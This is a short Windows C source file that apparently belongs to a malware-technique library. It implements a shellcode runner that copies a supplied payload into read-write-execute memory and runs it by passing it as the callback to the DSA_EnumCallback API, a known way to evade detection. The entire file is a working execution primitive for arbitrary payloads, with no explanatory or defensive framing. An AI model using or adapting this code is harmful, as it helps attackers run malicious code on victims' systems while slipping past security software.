#include "Win32Helper.h"

VOID InvokeDSA_EnumCallbackCallbackRoutine(LPVOID lpParameter)
{
	HDSA hDSA = NULL;

	hDSA = DSA_Create(1, 1);
	if (hDSA == NULL)
		goto EXIT_ROUTINE;

	if (DSA_InsertItem(hDSA, 0x7ffffff, &hDSA) == -1)
		goto EXIT_ROUTINE;

	DSA_EnumCallback(hDSA, (PFNDAENUMCALLBACK)lpParameter, NULL);

EXIT_ROUTINE:

	if(hDSA)
		DSA_Destroy(hDSA);

	return;
}

BOOL MpfSceViaDSA_EnumCallback(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeDSA_EnumCallbackCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}